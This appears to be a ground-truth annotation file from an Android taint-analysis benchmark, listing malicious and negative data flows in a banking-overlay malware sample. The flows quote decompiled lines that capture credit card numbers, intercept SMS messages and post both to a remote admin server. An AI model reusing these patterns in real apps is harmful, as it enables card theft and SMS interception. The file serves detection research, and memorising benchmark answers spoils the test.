@@ -1,0 +1,336 @@
+{
+  "fileName": "overlay_android_samp.apk",
+  "day": "2019-07-25",
+  "findings": [
+    {
+      "source": {
+        "statement": "this.ccBox = (CreditCardNumberEditText) findViewById(R.id.cc_box);",
+        "methodName": "public void onCreate(Bundle savedInstanceState)",
+        "className": "exts.whats.activities.Cards",
+        "lineNo": 118,
+        "targetName": "findViewById",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r0.<exts.whats.activities.Cards: android.view.View findViewById(int)>(2131492880)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "startService(start);",
+        "methodName": "public void sendData()",
+        "className": "exts.whats.activities.Cards",
+        "lineNo": 322,
+        "targetName": "startService",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r0.<exts.whats.activities.Cards: android.content.ComponentName startService(android.content.Intent)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cards.this.sendData();",
+          "methodName": "public void onClick(View v)",
+          "className": "exts.whats.activities.Cards.AnonymousClass3",
+          "lineNo": 191,
+          "ID": 1
+        },
+        {
+          "statement": "cardObject.put(\"number\", this.ccBox.getText().toString());",
+          "methodName": "public void sendData()",
+          "className": "exts.whats.activities.Cards",
+          "lineNo": 312,
+          "ID": 2
+        },
+        {
+          "statement": "start.putExtra(\"data\", cardObject.toString());",
+          "methodName": "public void sendData()",
+          "className": "exts.whats.activities.Cards",
+          "lineNo": 321,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "partialFlow": true
+      },
+      "ID": 1,
+      "description": "This malicious partial ICC flow starts by reading credit card number from user input and writes to a field of the Activity. When the user performs a click on a button, the information stealing starts. The information will be written to a JSONObject which will be stored into an Intent with the name data. With this intent a new SendService which leaks the card number will be started. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Sender.request(this.httpClient, adminLink, RequestFactory.makeCardData(appId, new JSONObject(intent.getStringExtra(\"data\"))).toString());",
+        "methodName": "public void onHandleIntent(Intent intent)",
+        "className": "exts.whats.SendService",
+        "lineNo": 69,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r1.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"data\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse response = httpClient.execute(request);",
+        "methodName": "public static JSONObject request(DefaultHttpClient httpClient, String serverURL, String data)",
+        "className": "exts.whats.utils.Sender",
+        "lineNo": 17,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r0.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "StringEntity se = new StringEntity(data, \"UTF-8\");",
+          "methodName": "public static JSONObject request(DefaultHttpClient httpClient, String serverURL, String data)",
+          "className": "exts.whats.utils.Sender",
+          "lineNo": 14,
+          "ID": 1
+        },
+        {
+          "statement": "request.setEntity(se);",
+          "methodName": "public static JSONObject request(DefaultHttpClient httpClient, String serverURL, String data)",
+          "className": "exts.whats.utils.Sender",
+          "lineNo": 16,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "interComponentCommunication": true,
+        "partialFlow": true
+      },
+      "ID": 2,
+      "description": "This malicious partial ICC flow reads credit card information from the Intent with which the SendSevice is started and sends it to a remote server per an HTTP POST request. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Bundle bundle = intent.getExtras();",
+        "methodName": "private static Map<String, String> retrieveMessages(Intent intent)",
+        "className": "exts.whats.MessageReceiver",
+        "lineNo": 38,
+        "targetName": "getExtras",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r2 = virtualinvoke $r0.<android.content.Intent: android.os.Bundle getExtras()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "context.startService(start);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "exts.whats.MessageReceiver",
+        "lineNo": 28,
+        "targetName": "startService",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r1.<android.content.Context: android.content.ComponentName startService(android.content.Intent)>($r2)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Object[] pdus = (Object[]) bundle.get(\"pdus\");",
+          "methodName": "private static Map<String, String> retrieveMessages(Intent intent)",
+          "className": "exts.whats.MessageReceiver",
+          "lineNo": 40,
+          "ID": 1
+        },
+        {
+          "statement": "messagesArray[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);",
+          "methodName": "private static Map<String, String> retrieveMessages(Intent intent)",
+          "className": "exts.whats.MessageReceiver",
+          "lineNo": 46,
+          "ID": 2
+        },
+        {
+          "statement": "messages.put(originatingAddress, new StringBuilder(String.valueOf((String) messages.get(originatingAddress))).append(messagesArray[i].getMessageBody()).toString());",
+          "methodName": "private static Map<String, String> retrieveMessages(Intent intent)",
+          "className": "exts.whats.MessageReceiver",
+          "lineNo": 57,
+          "ID": 3
+        },
+        {
+          "statement": "return messages;",
+          "methodName": "private static Map<String, String> retrieveMessages(Intent intent)",
+          "className": "exts.whats.MessageReceiver",
+          "lineNo": 62,
+          "ID": 4
+        },
+        {
+          "statement": "Map<String, String> messages = retrieveMessages(intent);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "exts.whats.MessageReceiver",
+          "lineNo": 19,
+          "ID": 5
+        },
+        {
+          "statement": "String text = (String) messages.get(sender);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "exts.whats.MessageReceiver",
+          "lineNo": 21,
+          "ID": 6
+        },
+        {
+          "statement": "start.putExtra(\"text\", text);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "exts.whats.MessageReceiver",
+          "lineNo": 27,
+          "ID": 7
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "collections": true,
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "partialFlow": true
+      },
+      "ID": 3,
+      "description": "This malicious partial ICC flow starts by reading SMS messages from the Intent with which the MessageReceiver is started. The messages will be written to a Map which will be stored into an Intent. With this intent a new SendService which leaks the card number will be started.  ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Sender.request(this.httpClient, adminLink, RequestFactory.makeIncomingMessage(appId, intent.getStringExtra(\"number\"), intent.getStringExtra(\"text\")).toString());",
+        "methodName": "public void onHandleIntent(Intent intent)",
+        "className": "exts.whats.SendService",
+        "lineNo": 75,
+        "targetName": "getStringExtra",
+        "targetNo": 2,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r1.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"text\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse response = httpClient.execute(request);",
+        "methodName": "public static JSONObject request(DefaultHttpClient httpClient, String serverURL, String data)",
+        "className": "exts.whats.utils.Sender",
+        "lineNo": 17,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r0.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "StringEntity se = new StringEntity(data, \"UTF-8\");",
+          "methodName": "public static JSONObject request(DefaultHttpClient httpClient, String serverURL, String data)",
+          "className": "exts.whats.utils.Sender",
+          "lineNo": 14,
+          "ID": 1
+        },
+        {
+          "statement": "request.setEntity(se);",
+          "methodName": "public static JSONObject request(DefaultHttpClient httpClient, String serverURL, String data)",
+          "className": "exts.whats.utils.Sender",
+          "lineNo": 16,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "interComponentCommunication": true,
+        "partialFlow": true
+      },
+      "ID": 4,
+      "description": "This malicious partial ICC flow reads SMS messages from the Intent with which the SendService is started and sents it to a remote server per an HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String packageNew = getIntent().getStringExtra(\"package\");",
+        "methodName": "public void onNewIntent(Intent intent)",
+        "className": "exts.whats.activities.Cards",
+        "lineNo": 527,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r2 = virtualinvoke $r1.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"package\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "startService",
+        "targetNo": 1,
+        "statement": "startService(start);",
+        "methodName": "public void sendData()",
+        "className": "exts.whats.activities.Cards",
+        "lineNo": 322,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r0.<exts.whats.activities.Cards: android.content.ComponentName startService(android.content.Intent)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow. ",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 5
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "this.packageName = getIntent().getStringExtra(\"package\");",
+        "methodName": "public void onCreate(Bundle savedInstanceState)",
+        "className": "exts.whats.activities.Cards",
+        "lineNo": 112,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r6.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"package\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "startService",
+        "targetNo": 1,
+        "statement": "startService(start);",
+        "methodName": "public void sendData()",
+        "className": "exts.whats.activities.Cards",
+        "lineNo": 322,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r0.<exts.whats.activities.Cards: android.content.ComponentName startService(android.content.Intent)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow. ",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 6
+    }
+  ]
+}
